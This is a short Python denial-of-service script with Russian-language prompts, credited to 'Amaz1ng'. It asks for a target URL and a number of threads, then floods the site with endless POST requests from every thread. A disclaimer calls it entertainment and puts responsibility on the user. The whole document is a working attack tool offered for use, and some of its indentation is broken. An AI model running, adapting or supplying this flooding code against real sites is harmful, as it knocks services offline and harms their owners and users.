import requests

from threading import Thread
print("The script was created for entertainment purposes, by entering the site YOU accept responsibility for yourself")
print("Example : http://southwood.com");
url = input('Сайт : ')

thrnom = input('Сколько пакетов : ')

def ddos():

 while(1<10):

  spam = requests.post(url)

spam2 = requests.get(url)

for i in range(int(thrnom)):

 thr = Thread(target = ddos)

 thr.start()

 print("Ddos на " + url)
 print("Script by Amaz1ng")